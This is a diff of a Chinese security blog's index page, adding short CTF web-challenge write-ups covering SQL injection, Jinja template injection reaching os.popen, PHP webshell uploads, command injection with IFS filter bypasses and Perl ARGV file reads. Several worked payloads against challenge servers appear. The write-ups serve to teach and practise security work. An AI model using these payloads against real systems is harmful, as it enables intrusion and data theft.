@@ -188,6 +188,553 @@
     <ul class="post-list">
     
         <li class="post-list-item fade">
+            <article id="post-Web_php_unserialize&amp;supersqli&amp;easy_tornado"
+  class="article-card article-type-post" itemprop="blogPost">
+
+    
+
+
+  
+    <h3 class="post-title" itemprop="name">
+      <a href="/2020/06/20/Web_php_unserialize&supersqli&easy_tornado/">Web_php_unserialize&amp;supersqli&amp;easy_tornado</a>
+    </h3>
+  
+
+
+
+
+     <div class="post-meta">
+        <time class="post-time" title="2020-06-20 15:40:29" datetime="2020-06-20T07:40:29.045Z"  itemprop="datePublished">2020-06-20</time>
+
+    </div>
+
+    <div class="post-content" id="post-content" itemprop="postContent">
+
+    
+        <h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h2><p><strong>审计+绕过</strong></p>
+<p>绕过点1.正则表达式，将数字前加上“+”</p>
+<p>绕过点2.wakeup函数，将序列化后的属性个数改成一个大于实际属性个数的值</p>
+<h2 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">--1(骚方法)</span><br><span class="line">?inject=1';handler `1919810931114514` open;handler `1919810931114514` read first;-- +</span><br><span class="line"></span><br><span class="line">--2(加id)</span><br><span class="line">inject=1';rename tables `words` to `words1`;rename tables `1919810931114514` to `words`;alter table `words` add `id` int;--+</span><br><span class="line"></span><br><span class="line">--3改（id）</span><br><span class="line">?inject=1';rename tables `words` to `words1`;rename tables `1919810931114514` to `words`;alter table `words` change `flag`  `id` varchar(255);--+</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+
+
+<h2 id="easytornado"><a href="#easytornado" class="headerlink" title="easytornado"></a>easytornado</h2><p>模板注入</p>
+<p>1.进入hints.txt得到filehash的构造形式，md5(cookie_secret+md5(filename))</p>
+<p>2.来到flag.txt得到flag的路径，即图中的filename，现在只需得到cookie_secret</p>
+<p>3.不构造filehash直接访问/fllllllllllllag,发现url中有get传参msg，可能存在注入。</p>
+<p>4.查询得知cookie_secret在handler.settings中，传参?msg=得到cookie_setting</p>
+<p>5.按照filehash的形式构造哈希传入即可得到flag</p>
+<p><strong>handler类，它代表着业务逻辑，我们进行服务端开发时就是编写一堆一堆的handler用来服务客户端请求。路由表，它将指定的url规则和handler挂接起来，形成一个路由映射表。当请求到来时，根据请求的访问url查询路由映射表来找到相应的业务handler。</strong></p>
+<p>handler 指向RequestHandler<br>而RequestHandler.settings又指向self.application.settings<br>所有handler.settings就指向RequestHandler.application.settings了！</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+    
+        <div class="post-more-div">
+            <a href="/2020/06/20/Web_php_unserialize&supersqli&easy_tornado/" class="post-more waves-button">
+                Continue reading...
+            </a>
+        </div>
+    </div>
+    
+</article>
+
+        </li>
+    
+        <li class="post-list-item fade">
+            <article id="post-Web_php_include&amp;ics-06"
+  class="article-card article-type-post" itemprop="blogPost">
+
+    
+
+
+  
+    <h3 class="post-title" itemprop="name">
+      <a href="/2020/06/20/Web_php_include&ics-06/">Web_php_include&amp;ics-06</a>
+    </h3>
+  
+
+
+
+
+     <div class="post-meta">
+        <time class="post-time" title="2020-06-20 15:40:29" datetime="2020-06-20T07:40:29.044Z"  itemprop="datePublished">2020-06-20</time>
+
+    </div>
+
+    <div class="post-content" id="post-content" itemprop="postContent">
+
+    
+        <p>1.thinkphp 5.0.20 </p>
+<p>rce命令执行漏洞</p>
+<p>2.怎么利用webshell，怎么植入一个webshell</p>
+<h2 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h2><p>1.strstr()函数对大小写敏感，利用大写PHP绕过过滤</p>
+<p><strong>php://input</strong>不是很了解，但是题目基本能做</p>
+<h2 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h2><p>观察到url中有id，进行爆破即可</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+    
+        <div class="post-more-div">
+            <a href="/2020/06/20/Web_php_include&ics-06/" class="post-more waves-button">
+                Continue reading...
+            </a>
+        </div>
+    </div>
+    
+</article>
+
+        </li>
+    
+        <li class="post-list-item fade">
+            <article id="post-unserialize3&amp;upload1&amp;Web_python_template_injection"
+  class="article-card article-type-post" itemprop="blogPost">
+
+    
+
+
+  
+    <h3 class="post-title" itemprop="name">
+      <a href="/2020/06/20/unserialize3&upload1&Web_python_template_injection/">unserialize3&amp;upload1&amp;Web_python_template_injection</a>
+    </h3>
+  
+
+
+
+
+     <div class="post-meta">
+        <time class="post-time" title="2020-06-20 15:40:29" datetime="2020-06-20T07:40:29.042Z"  itemprop="datePublished">2020-06-20</time>
+
+    </div>
+
+    <div class="post-content" id="post-content" itemprop="postContent">
+
+    
+        <h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h2><p>wakeup函数在反序列化之前调用。</p>
+<p>如果序列化后声明的的属性个数大于实际的属性个数，就可绕过wakeup函数。</p>
+<h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p>审计源码发现只支持jpg或png后缀</p>
+<p>编辑一句话代码，虚晃一枪将后缀改为jpg</p>
+<p>上传时抓包，更改回php后缀，木马植入成功。</p>
+<h2 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h2><p>题目提示python模板注入</p>
+<p>1.首先尝试url/49回显49 说明存在注入</p>
+<p>2.接着找到os</p>
+<p>2.1找到str类</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://124.126.19.106:30931/{{' '.__class__}}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>2.2找到str类的父类object</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://124.126.19.106:30931/{{' '.__class__.__mro__[2]}}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>2.3找object类中的引用列表</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://124.126.19.106:30931/{{' '.__class__.__mro__[2].__subclasses__()}}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>2.4找到处于下标71的os的所在类site._Painter</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://124.126.19.106:30931/{{' '.__class__.__mro__[2].__subclasses__()[71]}}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>2.5找到os</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://124.126.19.106:30931/{{' '.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os']}}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>2.6执行命令为所欲为</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://124.126.19.106:30931/{{' '.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>2.7得到flag</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://124.126.19.106:30931/{{' '.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()}}</span><br></pre></td></tr></tbody></table></figure>
+
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+    
+        <div class="post-more-div">
+            <a href="/2020/06/20/unserialize3&upload1&Web_python_template_injection/" class="post-more waves-button">
+                Continue reading...
+            </a>
+        </div>
+    </div>
+    
+</article>
+
+        </li>
+    
+        <li class="post-list-item fade">
+            <article id="post-shrine&amp;lottery&amp;mfw"
+  class="article-card article-type-post" itemprop="blogPost">
+
+    
+
+
+  
+    <h3 class="post-title" itemprop="name">
+      <a href="/2020/06/20/shrine&lottery&mfw/">shrine&amp;lottery&amp;mfw</a>
+    </h3>
+  
+
+
+
+
+     <div class="post-meta">
+        <time class="post-time" title="2020-06-20 15:40:29" datetime="2020-06-20T07:40:29.039Z"  itemprop="datePublished">2020-06-20</time>
+
+    </div>
+
+    <div class="post-content" id="post-content" itemprop="postContent">
+
+    
+        <h2 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h2><p>1.进入网站看到一段python代码</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>) @ app.route(<span class="string">'/'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read() @ app.route(<span class="string">'/shrine/'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        <span class="comment">#过滤括号</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="comment">#过滤config 和self</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'{{% set {}=None%}}'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>2.不了解框架，直接上网搜payload：</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{get_flashed_messages.__globals__['current_app'].config['FLAG']}}</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="2-lottery"><a href="#2-lottery" class="headerlink" title="2.lottery"></a>2.lottery</h2><p>1.发现robots.txt中泄露了.git</p>
+<p>2.利用githack下载源码</p>
+<p>3.在api.php中发现了猜数字的代码，存在弱类型“==”漏洞。传入参数[true,true…..]即可得到钱。</p>
+<h2 id="3-mfw"><a href="#3-mfw" class="headerlink" title="3.mfw"></a>3.mfw</h2><p>1.网页提示git，怀疑存在git泄露</p>
+<p>2.利用githack下载源码，发现flag.php但是并没有内容</p>
+<p>3.继续看index.php发现存在命令执行漏洞。构造page=abc’) or system(“cat templates/flag.php”);//传入即可</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+    
+        <div class="post-more-div">
+            <a href="/2020/06/20/shrine&lottery&mfw/" class="post-more waves-button">
+                Continue reading...
+            </a>
+        </div>
+    </div>
+    
+</article>
+
+        </li>
+    
+        <li class="post-list-item fade">
+            <article id="post-EasySQL"
+  class="article-card article-type-post" itemprop="blogPost">
+
+    
+
+
+  
+    <h3 class="post-title" itemprop="name">
+      <a href="/2020/06/20/EasySQL/">EasySQL</a>
+    </h3>
+  
+
+
+
+
+     <div class="post-meta">
+        <time class="post-time" title="2020-06-20 15:40:29" datetime="2020-06-20T07:40:29.035Z"  itemprop="datePublished">2020-06-20</time>
+
+    </div>
+
+    <div class="post-content" id="post-content" itemprop="postContent">
+
+    
+        <h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>1.发现只有输入“非0数字”会有回显。猜测sql语句可能存在“||”。猜测sql语句为</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"<span class="keyword">select</span><span class="string">".post['query']."</span>||flag <span class="keyword">from</span> Flag<span class="string">";</span></span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>1.构造payload：”*,1”进行查询，则执行的sql语句为</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> *,<span class="number">1</span>||flag <span class="keyword">from</span> Flag;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>2.构造payload：”1;set sql_mode=pipes_as_concat;select 1”进行查询，则执行的sql语句为</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>;set_sql_mode=pipes_as_concat;<span class="keyword">select</span> <span class="number">1</span>||flag <span class="keyword">from</span> Flag;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>sql_mode=pipes_as_concat可以将||的作用由<strong>or</strong>变为<strong>字符串拼接</strong></p>
+<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>万能密码登陆即可</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+    
+        <div class="post-more-div">
+            <a href="/2020/06/20/EasySQL/" class="post-more waves-button">
+                Continue reading...
+            </a>
+        </div>
+    </div>
+    
+</article>
+
+        </li>
+    
+        <li class="post-list-item fade">
+            <article id="post-bug&amp;i-got-id-200"
+  class="article-card article-type-post" itemprop="blogPost">
+
+    
+
+
+  
+    <h3 class="post-title" itemprop="name">
+      <a href="/2020/06/20/bug&i-got-id-200/">bug&amp;i-got-id-200</a>
+    </h3>
+  
+
+
+
+
+     <div class="post-meta">
+        <time class="post-time" title="2020-06-20 15:40:29" datetime="2020-06-20T07:40:29.033Z"  itemprop="datePublished">2020-06-20</time>
+
+    </div>
+
+    <div class="post-content" id="post-content" itemprop="postContent">
+
+    
+        <h2 id="bug"><a href="#bug" class="headerlink" title="bug"></a>bug</h2><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>1.创建账号登陆后发现manage选项只有管理员能点</p>
+<p>2.尝试更改用户名为admin，使用找回密码，抓包将用户名修改为admin</p>
+<p>3.用admin登陆查看manage发现IP不对，更改XFF头127.0.0.1</p>
+<p>4.成功进入manage功能，发现没什么功能。查看源码发现可以传get参数</p>
+<p>5.do参数未知，需要我们尝试，尝试include,upload，发现是upload</p>
+<p>9.尝试植入php一句话木马，失败，有检测。</p>
+<p>10.尝试改后缀为php5，还是不行。</p>
+<p>11.用js代码绕过，<strong>后缀继续用php5</strong>，得到flag</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language="php"&gt;system("ls");&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="tip"><a href="#tip" class="headerlink" title="tip"></a>tip</h3><p>1.抓包修改用户名</p>
+<p>2.改php后缀为php5</p>
+<p>3.利用js代码修改language参数执行php代码</p>
+<h2 id="i-got-id-200"><a href="#i-got-id-200" class="headerlink" title="i-got-id-200"></a>i-got-id-200</h2><h3 id="知识背景"><a href="#知识背景" class="headerlink" title="知识背景"></a>知识背景</h3><h4 id="Perl语言（CGI模块）"><a href="#Perl语言（CGI模块）" class="headerlink" title="Perl语言（CGI模块）"></a>Perl语言（CGI模块）</h4><h5 id="1-upload函数用于处理文件上传。函数参数为html代码input标签中的name"><a href="#1-upload函数用于处理文件上传。函数参数为html代码input标签中的name" class="headerlink" title="1.upload函数用于处理文件上传。函数参数为html代码input标签中的name"></a><strong>1.upload函数用于处理文件上传。函数参数为html代码input标签中的name</strong></h5><h5 id="2-param函数用于获取上传的文件。函数参数同upload"><a href="#2-param函数用于获取上传的文件。函数参数同upload" class="headerlink" title="2.param函数用于获取上传的文件。函数参数同upload"></a><strong>2.param函数用于获取上传的文件。函数参数同upload</strong></h5><h5 id="3-Perl使用文件句柄类型的变量来操作文件（包括向文件中读写数据）"><a href="#3-Perl使用文件句柄类型的变量来操作文件（包括向文件中读写数据）" class="headerlink" title="3.Perl使用文件句柄类型的变量来操作文件（包括向文件中读写数据）"></a><strong>3.Perl使用文件句柄类型的变量来操作文件（包括向文件中读写数据）</strong></h5><p>需要使用“&lt;&gt;”运算符，括号内如果是文件句柄，则会读取文件句柄</p>
+<h5 id="4-输出文件内容"><a href="#4-输出文件内容" class="headerlink" title="4.输出文件内容"></a><strong>4.输出文件内容</strong></h5><p>这里要用到$_变量</p>
+<p><strong>$_是默认参数，在没有指定值得情况下，默认处理上一个变量。</strong></p>
+<p>如：读取文件每一行</p>
+<p><strong><code>while ( &lt;$file&gt; ) { print "$_"; }</code></strong></p>
+<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><h5 id="1-新增一个文件上传，删掉文件名。将文件内容改成”ARGV”，此时-file的值变成了ARGV，ARGV会将-ARGV数组的每一项作为文件名并读取。"><a href="#1-新增一个文件上传，删掉文件名。将文件内容改成”ARGV”，此时-file的值变成了ARGV，ARGV会将-ARGV数组的每一项作为文件名并读取。" class="headerlink" title="1.新增一个文件上传，删掉文件名。将文件内容改成”ARGV”，此时$file的值变成了ARGV，ARGV会将@ARGV数组的每一项作为文件名并读取。"></a>1.新增一个文件上传，删掉文件名。将文件内容改成”ARGV”，此时$file的值变成了ARGV，ARGV会将@ARGV数组的每一项作为文件名并读取。</h5><h5 id="2-控制-ARGV数组，只需在url后添加路径即可。此时就能实现任意文件读取"><a href="#2-控制-ARGV数组，只需在url后添加路径即可。此时就能实现任意文件读取" class="headerlink" title="2.控制@ARGV数组，只需在url后添加路径即可。此时就能实现任意文件读取"></a>2.控制@ARGV数组，只需在url后添加路径即可。此时就能实现任意文件读取</h5><h5 id="3-可直接通过读取flag文件获得flag，但是通常需要查找"><a href="#3-可直接通过读取flag文件获得flag，但是通常需要查找" class="headerlink" title="3.可直接通过读取flag文件获得flag，但是通常需要查找"></a>3.可直接通过读取flag文件获得flag，但是通常需要查找</h5><p>查找语句</p>
+<p>1.url+“/bin/bash%20-c%20ls$IFS/|”</p>
+<p>2.url+“/bin/bash%20-c%20cat${IFS}/flag|”</p>
+<p><a href="https://www.guildhab.top/?p=867" target="_blank" rel="noopener">https://www.guildhab.top/?p=867</a></p>
+<p><a href="https://blog.csdn.net/qq_41617034/article/details/105518914?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.nonecase" target="_blank" rel="noopener">https://blog.csdn.net/qq_41617034/article/details/105518914?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.nonecase</a></p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+    
+        <div class="post-more-div">
+            <a href="/2020/06/20/bug&i-got-id-200/" class="post-more waves-button">
+                Continue reading...
+            </a>
+        </div>
+    </div>
+    
+</article>
+
+        </li>
+    
+        <li class="post-list-item fade">
+            <article id="post-[RoarCTF 2019]Easy Calc"
+  class="article-card article-type-post" itemprop="blogPost">
+
+    
+
+
+  
+    <h3 class="post-title" itemprop="name">
+      <a href="/2020/06/20/%5BRoarCTF%202019%5DEasy%20Calc/">[RoarCTF 2019]Easy Calc</a>
+    </h3>
+  
+
+
+
+
+     <div class="post-meta">
+        <time class="post-time" title="2020-06-20 15:40:29" datetime="2020-06-20T07:40:29.029Z"  itemprop="datePublished">2020-06-20</time>
+
+    </div>
+
+    <div class="post-content" id="post-content" itemprop="postContent">
+
+    
+        <h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>1.绕过waf，waf不允许num传字母。于是在参数名num前面加空格。waf在检查时找不到num变量，而php解析时会先把空格去掉。</p>
+<p>2.查看目录下所有文件，但“/”被过滤，用chr(47)绕过</p>
+<p>3.同样的方式将flag所在文件名用chr()形式传入即可</p>
+<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>Flask session欺骗</p>
+<p><a href="https://blog.csdn.net/weixin_44677409/article/details/100733581?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522158995821619195239859108%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=158995821619195239859108&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v2~pc_rank_v3-1-100733581.first_rank_ecpm_v2_pc_rank_v3&amp;utm_term=%5BHCTF+2018%5Dadmin" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44677409/article/details/100733581?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522158995821619195239859108%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=158995821619195239859108&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v2~pc_rank_v3-1-100733581.first_rank_ecpm_v2_pc_rank_v3&amp;utm_term=%5BHCTF+2018%5Dadmin</a></p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+    
+        <div class="post-more-div">
+            <a href="/2020/06/20/%5BRoarCTF%202019%5DEasy%20Calc/" class="post-more waves-button">
+                Continue reading...
+            </a>
+        </div>
+    </div>
+    
+</article>
+
+        </li>
+    
+        <li class="post-list-item fade">
+            <article id="post-[GXYCTF2019]Ping Ping Ping"
+  class="article-card article-type-post" itemprop="blogPost">
+
+    
+
+
+  
+    <h3 class="post-title" itemprop="name">
+      <a href="/2020/06/20/%5BGXYCTF2019%5DPing%20Ping%20Ping/">[GXYCTF2019]Ping Ping Ping</a>
+    </h3>
+  
+
+
+
+
+     <div class="post-meta">
+        <time class="post-time" title="2020-06-20 15:40:29" datetime="2020-06-20T07:40:29.027Z"  itemprop="datePublished">2020-06-20</time>
+
+    </div>
+
+    <div class="post-content" id="post-content" itemprop="postContent">
+
+    
+        <h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><h3 id="tip"><a href="#tip" class="headerlink" title="tip"></a>tip</h3><p>1.“$IFS$1” 或“${IFS}$”可替代空格</p>
+<p>2.可以将过滤的字符经过base64编码后传入</p>
+<p>3.利用反引号将反引号内的命令的输出作为输入执行</p>
+<p>4.创建变量构造payload: ?ip=127.0.0.1;x=g;cat$IFS$1fla$x.php</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+    
+        <div class="post-more-div">
+            <a href="/2020/06/20/%5BGXYCTF2019%5DPing%20Ping%20Ping/" class="post-more waves-button">
+                Continue reading...
+            </a>
+        </div>
+    </div>
+    
+</article>
+
+        </li>
+    
+        <li class="post-list-item fade">
             <article id="post-jother编码"
   class="article-card article-type-post" itemprop="blogPost">
 
@@ -327,189 +874,15 @@
 
         </li>
     
-        <li class="post-list-item fade">
-            <article id="post-mysql知识点"
-  class="article-card article-type-post" itemprop="blogPost">
-
-    
-
-
-  
-    <h3 class="post-title" itemprop="name">
-      <a href="/2020/06/19/mysql%E7%9F%A5%E8%AF%86%E7%82%B9/">mysql知识点</a>
-    </h3>
-  
-
-
-
-
-     <div class="post-meta">
-        <time class="post-time" title="2020-06-19 20:43:55" datetime="2020-06-19T12:43:55.688Z"  itemprop="datePublished">2020-06-19</time>
-
-    </div>
-
-    <div class="post-content" id="post-content" itemprop="postContent">
-
-    
-        <p>[TOC]</p>
-<h1 id="Sql知识点"><a href="#Sql知识点" class="headerlink" title="Sql知识点"></a>Sql知识点</h1><h2 id="去重"><a href="#去重" class="headerlink" title="去重"></a>去重</h2><p>统计岗位数量</p>
-<h2 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a>连接查询</h2><p>找出每个员工的部门名字和上级领导以及薪资等级，在一张表中呈现</p>
-<img src="/images/mysql知识点/image-20200427115210929.png" alt="image-20200427115210929" style="zoom:67%;">
-
-<h2 id="嵌套子查询"><a href="#嵌套子查询" class="headerlink" title="嵌套子查询"></a>嵌套子查询</h2><h5 id="找出每个部门平均薪资的等级"><a href="#找出每个部门平均薪资的等级" class="headerlink" title="找出每个部门平均薪资的等级"></a>找出每个部门平均薪资的等级</h5><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/images/mysql知识点/image-20200424195818187.png" alt="image-20200424195818187" title="">
-                </div>
-                <div class="image-caption">image-20200424195818187</div>
-            </figure>
-
-<p><strong>找出每个部门平均的薪资等级</strong></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/images/mysql知识点/image-20200424195846234.png" alt="image-20200424195846234" title="">
-                </div>
-                <div class="image-caption">image-20200424195846234</div>
-            </figure>
-
-<h2 id="Limit的使用（mysql特有的）"><a href="#Limit的使用（mysql特有的）" class="headerlink" title="Limit的使用（mysql特有的）"></a>Limit的使用（mysql特有的）</h2><p><strong>取出工资前五名</strong></p>
